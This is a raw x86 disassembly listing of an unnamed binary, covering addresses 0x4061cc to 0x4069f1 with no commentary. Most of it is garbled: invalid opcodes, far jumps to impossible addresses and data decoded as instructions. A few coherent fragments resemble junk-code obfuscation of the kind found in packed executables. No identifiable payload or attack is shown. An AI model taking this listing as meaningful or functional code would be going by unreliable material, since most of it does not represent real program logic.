  4061cc:	outs   dx,DWORD PTR ds:[esi]
  4061cd:	add    al,0x5b
  4061cf:	add    al,BYTE PTR [ebx+0x4e]
  4061d2:	add    bl,cl
  4061d4:	pop    esp
  4061d5:	sub    cl,BYTE PTR [ebx]
  4061d7:	add    eax,0x89b6ba65
  4061dc:	inc    esp
  4061dd:	out    0x9,al
  4061df:	cmc    
  4061e0:	sub    eax,DWORD PTR [ebx+0x3b84e364]
  4061e6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061e9:	or     ecx,DWORD PTR [esi]
  4061eb:	mov    ecx,0x8e33e227
  4061f0:	mov    ah,dl
  4061f2:	sub    dl,cl
  4061f4:	cmp    BYTE PTR [ebx],0x1e
  4061f7:	and    DWORD PTR ds:0x4ae0046,eax
  4061fd:	push   edi
  4061fe:	push   edi
  4061ff:	fldcw  WORD PTR [edx-0x7]
  406202:	add    BYTE PTR [ebx-0x2b],bl
  406205:	xor    esp,DWORD PTR [ebp+0x1f620210]
  40620b:	stos   BYTE PTR es:[edi],al
  40620c:	inc    esi
  40620d:	adc    bh,bl
  40620f:	add    ah,ch
  406211:	pop    ebp
  406212:	(bad)  
  406213:	cli    
  406214:	stos   BYTE PTR es:[edi],al
  406215:	fwait
  406216:	xlat   BYTE PTR ds:[ebx]
  406217:	xchg   esi,eax
  406218:	mov    esi,0xc134925b
  40621d:	xchg   ebp,ecx
  40621f:	ja     0x406264
  406221:	pop    ecx
  406222:	sub    al,0x5f
  406224:	clc    
  406225:	inc    ebp
  406226:	xchg   ebp,eax
  406227:	addr16 jbe 0x4061e2
  40622a:	(bad)  
  40622b:	rcr    DWORD PTR [edx-0x44ce5eb2],cl
  406231:	scas   al,BYTE PTR es:[edi]
  406232:	jl     0x406221
  406234:	push   ebp
  406235:	retf   0x8be7
  406238:	jmp    0x4062aa
  40623a:	adc    dh,BYTE PTR [ecx+0x4b]
  40623d:	inc    ebx
  40623e:	sub    esp,0x27
  406241:	push   edi
  406242:	mov    eax,ds:0x87c61fa8
  406247:	icebp  
  406248:	aas    
  406249:	ins    DWORD PTR es:[edi],dx
  40624a:	in     al,0xae
  40624c:	sub    ah,BYTE PTR [eax-0x31]
  40624f:	(bad)  
  406251:	sahf   
  406252:	out    0x63,eax
  406254:	or     DWORD PTR [ecx+0x17],0xffffffc8
  406258:	adc    ebx,esi
  40625a:	fstp   QWORD PTR [ebp+eiz*1-0x31]
  40625e:	push   esp
  40625f:	retf   0xc9d0
  406262:	shl    BYTE PTR ds:0x3bb116bd,cl
  406268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406269:	imul   esp,DWORD PTR [esp+eax*8],0xe22d3209
  406270:	push   ecx
  406271:	push   eax
  406272:	push   ebx
  406273:	mov    dl,0x7f
  406275:	popf   
  406276:	mul    ebx
  406278:	mov    dl,0xe7
  40627a:	inc    ebp
  40627b:	mov    eax,ds:0x139a7fbc
  406280:	add    eax,0x1087c351
  406285:	mov    bl,0xb1
  406287:	mov    bh,0x52
  406289:	stc    
  40628a:	js     0x4062cd
  40628c:	pop    es
  40628d:	in     eax,0x8b
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	or     esi,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi-0x76ffbd02],al
  40629f:	inc    esi
  4062a0:	or     al,0x9
  4062a2:	or     eax,0x42e7f3
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fe72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fe72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fe72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e63b
  4062e2:	cmp    DWORD PTR ds:0x42fe72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fe72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fe72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fe72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fe72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	jecxz  0x4062bf
  406330:	jne    0x406342
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x40637a
  40633b:	es cs icebp 
  40633e:	popa   
  40633f:	or     BYTE PTR [esi+edi*1-0x6c],0xe
  406344:	pop    es
  406345:	icebp  
  406346:	pop    ss
  406347:	stos   BYTE PTR es:[edi],al
  406348:	mov    eax,ds:0xfe5226dc
  40634d:	inc    esi
  40634e:	mov    bl,0x8e
  406350:	mov    ah,0xc0
  406352:	cli    
  406353:	sbb    BYTE PTR [ebx-0x3],ah
  406356:	sti    
  406357:	inc    edi
  406358:	call   0xa5c00d68
  40635d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40635e:	add    bl,BYTE PTR [ebp+0x72]
  406361:	cmp    eax,0xfce9e195
  406366:	stc    
  406367:	mov    WORD PTR [eax+edx*1-0x485e2a25],ds
  40636e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40636f:	outs   dx,BYTE PTR ds:[esi]
  406370:	sbb    ecx,DWORD PTR [esi+0x18]
  406373:	test   eax,0xe0818e4e
  406378:	sti    
  406379:	enterw 0xf430,0x67
  40637e:	dec    esi
  40637f:	push   eax
  406380:	mov    ds:0xceb83e8a,eax
  406385:	leave  
  406386:	sbb    eax,0xfa217571
  40638b:	or     edi,DWORD PTR [eax+ebp*1]
  40638e:	inc    esp
  40638f:	jae    0x406398
  406391:	push   ebx
  406392:	fdivr  st(7),st
  406394:	retf   
  406395:	xor    esi,ebp
  406397:	adc    eax,0x3bafff25
  40639c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40639d:	push   esp
  40639e:	jae    0x406403
  4063a0:	inc    edi
  4063a1:	sbb    eax,0x5efe8908
  4063a6:	repnz add eax,0xc77c3ed0
  4063ac:	pop    ds
  4063ad:	dec    edi
  4063ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063af:	popa   
  4063b0:	enter  0x1a0e,0xef
  4063b4:	mov    esp,0xcf31fad9
  4063b9:	std    
  4063ba:	push   0x940eda86
  4063bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063c0:	mov    cl,0xee
  4063c2:	inc    edi
  4063c3:	or     eax,DWORD PTR [esi+0x7cdca3c4]
  4063c9:	xchg   ecx,edx
  4063cb:	and    al,BYTE PTR [edi-0x637da7ff]
  4063d1:	push   cs
  4063d2:	mov    ds:0xb35f6ad4,al
  4063d7:	add    eax,0xa46bec24
  4063dc:	rol    BYTE PTR [edi-0x5f],0xa8
  4063e0:	xlat   BYTE PTR ds:[ebx]
  4063e1:	rcl    DWORD PTR [edx+0x26febdb7],cl
  4063e7:	scas   al,BYTE PTR es:[edi]
  4063e8:	sti    
  4063e9:	fs push cs
  4063eb:	test   al,0xad
  4063ed:	dec    ebx
  4063ee:	jecxz  0x406465
  4063f0:	xchg   edi,eax
  4063f1:	mov    ebx,0xf686c66c
  4063f6:	xchg   esp,eax
  4063f7:	cmp    eax,0xeb27488c
  4063fc:	test   cl,cl
  4063fe:	dec    ebx
  4063ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406400:	sbb    al,0xf4
  406402:	inc    ebx
  406403:	loopne 0x4063a0
  406405:	cmp    BYTE PTR fs:[esi],0x5a
  406409:	aad    0x80
  40640b:	data16 adc dh,BYTE PTR [ebp+edi*2+0x71]
  406410:	add    al,0x82
  406412:	iret   
  406413:	dec    edi
  406414:	sar    DWORD PTR fs:[ebp-0x17],1
  406418:	shld   DWORD PTR [di-0x19],esi,cl
  40641d:	outs   dx,DWORD PTR ds:[esi]
  40641e:	aas    
  40641f:	xchg   ecx,eax
  406420:	ret    
  406421:	sbb    ah,ah
  406423:	push   esp
  406424:	inc    esp
  406425:	adc    edx,DWORD PTR [edx]
  406427:	repnz cdq 
  406429:	es mov dh,0xfb
  40642c:	pop    ebp
  40642d:	xor    esi,esi
  40642f:	in     eax,0x7b
  406431:	pop    eax
  406432:	call   0xc8611f16
  406437:	and    al,0xe8
  406439:	dec    edx
  40643a:	loope  0x406440
  40643c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40643d:	(bad)  
  40643e:	mov    ebx,0xa163eb92
  406443:	fisttp WORD PTR [eax+0x43]
  406446:	pop    es
  406447:	fnstsw WORD PTR [edx+edi*1-0x1cd1faca]
  40644e:	jle    0x4063df
  406450:	mov    eax,DWORD PTR [ebx+0x6c]
  406453:	or     al,0x47
  406455:	es adc esi,ecx
  406458:	or     eax,0x4052e164
  40645d:	mov    ds:0xdcab786b,al
  406462:	or     bl,ch
  406464:	pop    ebx
  406465:	sbb    dh,BYTE PTR [esi-0x11]
  406468:	test   DWORD PTR [esi+ecx*4],eax
  40646b:	push   cs
  40646c:	jae    0x4064e5
  40646e:	jmp    0xaba681ec
  406473:	ja     0x40642f
  406475:	xchg   edi,eax
  406476:	test   eax,0x8dc2fca2
  40647b:	mov    BYTE PTR [esi-0x274cb895],bh
  406481:	imul   esp,DWORD PTR [esi],0x5133475f
  406487:	or     al,BYTE PTR [edi+0x32]
  40648a:	jb     0x40643f
  40648c:	loopne 0x4064bf
  40648e:	add    BYTE PTR [ecx+0xb51bbbd],ch
  406494:	jne    0x406472
  406496:	test   al,0xc
  406498:	daa    
  406499:	inc    esi
  40649a:	mul    DWORD PTR [eax-0x76]
  40649d:	int    0x2
  40649f:	inc    eax
  4064a0:	lahf   
  4064a1:	add    DWORD PTR [ebp+0x25],esi
  4064a4:	mov    bl,0x4c
  4064a6:	iret   
  4064a7:	lahf   
  4064a8:	and    ebx,DWORD PTR [edx-0xa27f1b3]
  4064ae:	test   DWORD PTR [ebx+0x52],edi
  4064b1:	push   edi
  4064b2:	fdivr  DWORD PTR [esi+eiz*2]
  4064b5:	retf   0x9c2c
  4064b8:	mov    edx,DWORD PTR [eax-0x378c8e5d]
  4064be:	ins    DWORD PTR es:[edi],dx
  4064bf:	and    eax,0x41604181
  4064c4:	cmc    
  4064c5:	cs (bad) 
  4064c7:	sub    BYTE PTR [ebp-0x408eb790],cl
  4064cd:	or     ch,BYTE PTR [edx+edx*4+0x15620d4e]
  4064d4:	xchg   BYTE PTR [ecx],bl
  4064d6:	and    eax,DWORD PTR [ecx-0x5]
  4064d9:	xchg   esi,eax
  4064da:	push   edi
  4064db:	into   
  4064dc:	xor    al,0x44
  4064de:	and    DWORD PTR [edx+0x78],ecx
  4064e1:	mov    ds:0xc2c95eef,al
  4064e6:	sbb    BYTE PTR [eax],al
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fe76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fdf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fe72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fe72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fdd9,0x42e7fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	loopne 0x406540
  406568:	retf   
  406569:	(bad)  
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	pop    edi
  406573:	aad    0xed
  406575:	int3   
  406576:	pop    eax
  406577:	or     eax,0x1e497764
  40657c:	hlt    
  40657d:	es pop ecx
  40657f:	sub    al,0xc5
  406581:	cmp    ebx,esp
  406583:	inc    esi
  406584:	or     BYTE PTR ss:[eax-0x3a],dl
  406588:	jle    0x4065aa
  40658a:	adc    al,ah
  40658c:	mov    bh,0xd1
  40658e:	jle    0x4065e9
  406590:	std    
  406591:	stos   DWORD PTR es:[edi],eax
  406592:	or     bh,al
  406594:	ds mov dh,0x5f
  406597:	stos   DWORD PTR es:[edi],eax
  406598:	(bad)  
  406599:	fisttp QWORD PTR [edi+0x1b]
  40659c:	pop    esi
  40659d:	scas   eax,DWORD PTR es:[edi]
  40659e:	mov    bh,0x42
  4065a0:	leave  
  4065a1:	int3   
  4065a2:	fistp  QWORD PTR [ebx-0x7c9b901f]
  4065a8:	mov    ds:0x3e086ee6,eax
  4065ad:	cmp    eax,0x8119afc6
  4065b2:	adc    ah,ah
  4065b4:	stos   BYTE PTR es:[edi],al
  4065b5:	xor    al,0x7
  4065b7:	mov    edx,0x6196a183
  4065bc:	mov    esp,0x9baf22d6
  4065c1:	jb     0x406621
  4065c3:	mov    ah,0x4
  4065c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065c6:	int    0x86
  4065c8:	rcr    al,cl
  4065ca:	jmp    0x4065c7
  4065cc:	xchg   ebp,eax
  4065cd:	push   edx
  4065ce:	mov    al,0x5f
  4065d0:	add    al,0x18
  4065d2:	fs jnp 0x406648
  4065d5:	mov    al,ds:0xeeadf320
  4065da:	inc    ecx
  4065db:	push   ecx
  4065dc:	or     eax,ecx
  4065de:	mov    al,0x34
  4065e0:	test   BYTE PTR [edi-0x27a4ea30],ch
  4065e6:	hlt    
  4065e7:	sub    al,BYTE PTR [ebx-0x5918bb0d]
  4065ed:	add    dl,cl
  4065ef:	sbb    dl,BYTE PTR [esi]
  4065f1:	jns    0x4065de
  4065f3:	int    0x3c
  4065f5:	sub    al,BYTE PTR [ecx+0x69f08d0e]
  4065fb:	popf   
  4065fc:	xor    esp,DWORD PTR [edi+0x4a]
  4065ff:	call   0xf026:0x7a556c
  406606:	jmp    0xe70c:0x552ad6d6
  40660d:	cmp    esi,DWORD PTR [ecx+0x50cb1c9]
  406613:	dec    edx
  406614:	push   edi
  406615:	(bad)  
  406616:	cmp    esp,DWORD PTR [eax+ebp*1-0x23]
  40661a:	push   esp
  40661b:	sub    bh,al
  40661d:	jmp    0xe844:0x4846ea6d
  406624:	push   esp
  406625:	sbb    edi,DWORD PTR [edi-0x635696d3]
  40662b:	xchg   ebx,eax
  40662c:	mov    dl,0x54
  40662e:	mov    bh,0xf6
  406630:	pop    esp
  406631:	mov    WORD PTR [ecx],?
  406633:	out    dx,eax
  406634:	mov    ds:0x8a52f1a1,al
  406639:	pushf  
  40663a:	xor    ecx,DWORD PTR [edi-0x37765dd7]
  406640:	test   ch,dl
  406642:	mov    al,ds:0x154677fa
  406647:	cmp    BYTE PTR [edx],al
  406649:	clc    
  40664a:	mov    al,dl
  40664c:	fcmovbe st,st(3)
  40664e:	clc    
  40664f:	clc    
  406650:	inc    edi
  406651:	fmul   st,st(7)
  406653:	cs mul cl
  406656:	call   0xb9521c39
  40665b:	outs   dx,DWORD PTR ds:[esi]
  40665c:	fbld   TBYTE PTR ds:0x49492972
  406662:	ds and al,0x50
  406665:	in     al,dx
  406666:	add    ecx,DWORD PTR [ecx+0x27846a20]
  40666c:	push   ebp
  40666d:	cmp    eax,0x69eaeac9
  406672:	adc    edi,DWORD PTR [edi]
  406674:	push   cs
  406675:	(bad)  
  406676:	(bad)
  406679:	jge    0x406680
  40667b:	ins    DWORD PTR es:[edi],dx
  40667c:	test   al,0xb
  40667e:	jmp    0x76d5c2c9
  406683:	add    al,0x76
  406685:	mov    eax,0xf10597ba
  40668a:	jb     0x406685
  40668c:	jl     0x40660f
  40668e:	mov    bh,0xae
  406690:	push   ss
  406691:	or     BYTE PTR [ebx],al
  406693:	sbb    ch,BYTE PTR [esi]
  406695:	jg     0x4066f8
  406697:	fild   DWORD PTR [ebx]
  406699:	jb     0x406668
  40669b:	push   0xffffffab
  40669d:	mov    edx,0xe161d7ca
  4066a2:	outs   dx,BYTE PTR ds:[esi]
  4066a3:	mov    dl,0x1a
  4066a5:	xchg   esp,eax
  4066a6:	sbb    DWORD PTR [esp+esi*8],ebp
  4066a9:	push   cs
  4066aa:	pop    ecx
  4066ab:	adc    BYTE PTR [ebx],0x43
  4066ae:	adc    esi,ebx
  4066b0:	(bad)  
  4066b1:	loopne 0x406644
  4066b3:	and    al,0x7e
  4066b5:	mov    ebp,0xfd1389
  4066ba:	push   esi
  4066bb:	jge    0x406719
  4066bd:	mov    ds:0x6e87d86e,al
  4066c2:	call   0xc019:0x87e18dbe
  4066c9:	call   0x42f54404
  4066ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cf:	int3   
  4066d0:	push   es
  4066d1:	add    al,0xd1
  4066d3:	cmp    al,0x87
  4066d5:	dec    esp
  4066d6:	aad    0xd4
  4066d8:	mov    eax,0xa3715785
  4066dd:	dec    eax
  4066de:	jae    0x406695
  4066e0:	call   0x66e55126
  4066e5:	cmp    eax,0xa7327341
  4066ea:	push   ebp
  4066eb:	popf   
  4066ec:	shl    DWORD PTR [eax],cl
  4066ee:	sti    
  4066ef:	fild   DWORD PTR [edi]
  4066f1:	or     al,0xa9
  4066f3:	and    al,0x1
  4066f5:	pop    ebp
  4066f6:	sub    ch,dl
  4066f8:	in     al,dx
  4066f9:	jae    0x4066b3
  4066fb:	pop    ebp
  4066fc:	mov    bh,0x6b
  4066fe:	(bad)  
  4066ff:	popa   
  406700:	bound  esp,QWORD PTR ds:0x8c5dba0c
  406706:	push   eax
  406707:	aam    0xe5
  406709:	mov    esp,0x1ea9cf29
  40670e:	arpl   WORD PTR [edx-0x39401c50],sp
  406714:	or     DWORD PTR [esi+eiz*1+0x7911edb6],ebx
  40671b:	cmc    
  40671c:	pushf  
  40671d:	adc    eax,0xcc0ff6fe
  406722:	ret    
  406723:	adc    al,BYTE PTR [edx-0x41]
  406726:	popf   
  406727:	das    
  406728:	imul   ebx,DWORD PTR [ebx-0x1e],0xdb7c9cd0
  40672f:	retf   
  406730:	dec    ecx
  406731:	dec    ebp
  406732:	dec    ebp
  406733:	mov    dh,0x7
  406735:	xor    al,BYTE PTR [edi-0x5d34df05]
  40673b:	dec    ebp
  40673c:	inc    ecx
  40673d:	out    dx,al
  40673e:	inc    ecx
  40673f:	(bad)  
  406741:	dec    DWORD PTR [ebx-0x43206ac4]
  406747:	sbb    bh,BYTE PTR [ebx+0x2b]
  40674a:	adc    ebx,DWORD PTR [esp+eax*1+0x53]
  40674e:	xchg   ecx,eax
  40674f:	cld    
  406750:	hlt    
  406751:	push   cs
  406752:	dec    ebp
  406753:	out    dx,al
  406754:	bound  ecx,QWORD PTR [ecx]
  406756:	jge    0x406774
  406758:	and    al,0xd8
  40675a:	aad    0x23
  40675c:	add    BYTE PTR [edi+0x38b4e7d2],0x13
  406763:	lds    edx,FWORD PTR [eax+0x55]
  406766:	pop    edi
  406767:	iret   
  406768:	push   edi
  406769:	sbb    eax,0x9dee333d
  40676e:	(bad)  
  406770:	addr16 daa 
  406772:	and    al,0xfe
  406774:	sub    ah,ch
  406776:	pop    ecx
  406777:	or     al,0xf8
  406779:	sbb    al,0xdd
  40677b:	jo     0x406791
  40677d:	mov    edx,0x79661f7e
  406782:	test   al,0xb1
  406784:	jo     0x4067cf
  406786:	retf   0x7808
  406789:	bound  ebp,QWORD PTR [ebp+0x43]
  40678c:	inc    eax
  40678d:	add    dh,BYTE PTR [esi-0x7b]
  406790:	ret    
  406791:	inc    edx
  406792:	jg     0x40675c
  406794:	mov    ebp,0xb1655b28
  406799:	dec    eax
  40679a:	push   esp
  40679b:	fadd   st,st(6)
  40679d:	cli    
  40679e:	div    ch
  4067a0:	test   al,0x39
  4067a2:	or     eax,DWORD PTR [ecx+0x77a537fe]
  4067a8:	outs   dx,DWORD PTR ds:[esi]
  4067a9:	push   edi
  4067aa:	stos   BYTE PTR es:[edi],al
  4067ab:	js     0x40678c
  4067ad:	inc    ecx
  4067ae:	push   esp
  4067af:	or     BYTE PTR [eax+0x1861491],cl
  4067b5:	pop    edx
  4067b6:	out    dx,al
  4067b7:	sbb    DWORD PTR [edi],ecx
  4067b9:	push   ds
  4067ba:	inc    ecx
  4067bb:	jbe    0x406818
  4067bd:	xor    ebp,0xe691415a
  4067c3:	shl    BYTE PTR [edx+eiz*2-0x30],cl
  4067c7:	je     0x406802
  4067c9:	xchg   ebp,eax
  4067ca:	cmp    BYTE PTR [edi-0x34],cl
  4067cd:	mov    ebp,0x9da01d41
  4067d2:	ja     0x40681f
  4067d4:	adc    al,0x1c
  4067d6:	adc    eax,0xb28df4eb
  4067db:	xchg   edx,eax
  4067dc:	stc    
  4067dd:	xlat   BYTE PTR ds:[ebx]
  4067de:	sub    BYTE PTR [eax],cl
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fdd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e220,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e7fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fde5,0x42e813
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	pusha  
  406847:	push   ebp
  406848:	fcmovne st,st(5)
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	std    
  406853:	aas    
  406854:	fsub   QWORD PTR gs:[ecx+0x77]
  406859:	icebp  
  40685a:	ins    DWORD PTR es:[edi],dx
  40685b:	loope  0x406810
  40685d:	aad    0x51
  40685f:	ret    0x741d
  406862:	sub    DWORD PTR [ecx+0x3a48e96c],0x3a
  406869:	jmp    0x406864
  40686b:	xchg   ecx,eax
  40686c:	out    dx,al
  40686d:	mov    esi,0x5ff4f7f5
  406872:	ins    BYTE PTR es:[edi],dx
  406873:	daa    
  406874:	pop    es
  406875:	xchg   edx,eax
  406876:	adc    esp,DWORD PTR [edi+0x71022e19]
  40687c:	ret    0x119c
  40687f:	test   DWORD PTR [edi+ebx*2],eax
  406882:	xor    dh,BYTE PTR [esi+0x66ffe656]
  406888:	jbe    0x406826
  40688a:	push   esp
  40688b:	fldenv [esp+ebp*2+0x5f855df4]
  406892:	ret    0x7a63
  406895:	xchg   ebp,eax
  406896:	lahf   
  406897:	inc    ebp
  406898:	ret    
  406899:	sub    bl,BYTE PTR [eax-0x69]
  40689c:	mov    al,BYTE PTR [ecx-0x3b91643d]
  4068a2:	loope  0x4068fe
  4068a4:	hlt    
  4068a5:	or     DWORD PTR [esi+0x7b7f2adf],ebx
  4068ab:	adc    eax,DWORD PTR [edx]
  4068ad:	stos   BYTE PTR es:[edi],al
  4068ae:	daa    
  4068af:	les    ebp,FWORD PTR [edi]
  4068b1:	fisttp WORD PTR [edi]
  4068b3:	mov    bh,0xcf
  4068b5:	push   ss
  4068b6:	add    bl,BYTE PTR [edi]
  4068b8:	stc    
  4068b9:	xor    al,0x80
  4068bb:	hlt    
  4068bc:	mov    al,0xa5
  4068be:	mov    ebp,0x1d525b67
  4068c3:	movaps xmm3,XMMWORD PTR [eax-0x79]
  4068c7:	mov    esp,0x2b117a10
  4068cc:	mov    bl,0xb8
  4068ce:	mov    dh,0xcd
  4068d0:	sbb    esi,DWORD PTR [ebx+0x53]
  4068d3:	outs   dx,BYTE PTR ds:[esi]
  4068d4:	popa   
  4068d5:	cmp    bl,dl
  4068d7:	mov    dl,0x51
  4068d9:	into   
  4068da:	xchg   esi,eax
  4068db:	xchg   ecx,eax
  4068dc:	push   ss
  4068dd:	dec    ecx
  4068df:	stc    
  4068e0:	xchg   ecx,eax
  4068e1:	push   ebp
  4068e2:	xor    eax,0x7d89207d
  4068e7:	push   0x74
  4068e9:	imul   ebp,DWORD PTR [ecx],0x9a1322c8
  4068ef:	or     cl,BYTE PTR [eax-0x74]
  4068f2:	test   al,0x2
  4068f4:	sub    eax,DWORD PTR [ebp-0x39d7edcb]
  4068fa:	jno    0x406936
  4068fc:	sbb    ah,BYTE PTR [edi]
  4068fe:	jns    0x406966
  406900:	add    esp,esp
  406902:	xor    cl,al
  406904:	fadd   st,st(4)
  406906:	fsubp  st(3),st
  406908:	test   eax,0x4ba811b8
  40690d:	cld    
  40690e:	xchg   ecx,eax
  40690f:	loop   0x40690a
  406911:	(bad)
  406914:	test   DWORD PTR [esi],ebx
  406916:	data16 shl BYTE PTR [edx-0x37a9efa8],0x48
  40691e:	mov    al,0x94
  406920:	seta   ah
  406923:	xchg   edi,eax
  406924:	ror    BYTE PTR [ecx-0x77],cl
  406927:	iret   
  406928:	mov    ds:0xdc9b4412,al
  40692d:	cwde   
  40692e:	call   DWORD PTR [esi]
  406930:	add    DWORD PTR [esi-0x2c5b56],eax
  406936:	pop    ss
  406937:	xor    eax,0xd406fcf5
  40693c:	int3   
  40693d:	lds    eax,FWORD PTR [esi+0x3ce256c5]
  406943:	dec    edx
  406944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406945:	push   ss
  406946:	jmp    0xd7d6:0x2170b63b
  40694d:	jg     0xcfadad89
  406953:	jp     0x406995
  406955:	or     BYTE PTR [edi],dl
  406957:	outs   dx,BYTE PTR ds:[esi]
  406958:	test   al,0xb8
  40695a:	(bad)  
  40695b:	into   
  40695c:	xor    ebp,DWORD PTR [esi+0x6efca860]
  406962:	push   esi
  406963:	adc    bh,al
  406965:	(bad)  
  406966:	std    
  406967:	mov    esi,0x51ab4c38
  40696c:	or     BYTE PTR [edi+0x72],0x91
  406970:	mov    eax,ds:0x87d9f5b5
  406975:	xchg   ebx,eax
  406976:	pop    ss
  406977:	mov    bh,0x27
  406979:	dec    ebx
  40697a:	pop    ds
  40697b:	pop    esp
  40697c:	std    
  40697d:	(bad)  
  40697e:	call   0x1b44:0x801dba93
  406985:	scas   ax,WORD PTR es:[edi]
  406987:	adc    DWORD PTR [ecx-0x5b],esi
  40698a:	repnz es mov eax,0xaf58dd77
  406991:	xchg   esp,eax
  406992:	adc    al,0x52
  406994:	xchg   ebx,eax
  406995:	(bad)  
  406996:	das    
  406997:	pop    es
  406998:	mov    BYTE PTR [edi+0x6c353601],dh
  40699e:	repnz (bad) 
  4069a0:	js     0x40698f
  4069a2:	and    bh,BYTE PTR [edx-0x6b]
  4069a5:	call   0xab05:0x2c6f9f20
  4069ac:	mov    cs,WORD PTR [edi-0x20497dc0]
  4069b2:	push   ss
  4069b3:	aad    0x47
  4069b5:	popa   
  4069b6:	adc    ecx,esi
  4069b8:	and    BYTE PTR [edi-0x24],0x49
  4069bc:	(bad)  
  4069bd:	neg    DWORD PTR [esi+0x1805f7e4]
  4069c3:	jp     0x406a19
  4069c5:	cmp    eax,0xe09812d7
  4069ca:	inc    ebp
  4069cb:	mov    ch,0x74
  4069cd:	scas   eax,DWORD PTR es:[edi]
  4069ce:	mov    ds:0x684e36f1,eax
  4069d3:	leave  
  4069d4:	jle    0x406a02
  4069d6:	scas   eax,DWORD PTR es:[edi]
  4069d7:	xor    esi,DWORD PTR [eax]
  4069d9:	test   BYTE PTR [esi-0x5b4e7ea7],ch
  4069df:	or     ecx,DWORD PTR [esi+eax*2-0x21]
  4069e3:	(bad)  
  4069e4:	and    eax,0xc35c6dbe
  4069e9:	imul   edx,DWORD PTR [ebp+edx*1-0x26],0x7f
  4069ee:	or     DWORD PTR [eax-0x40],eax
  4069f1:	mov    ah,0xe1
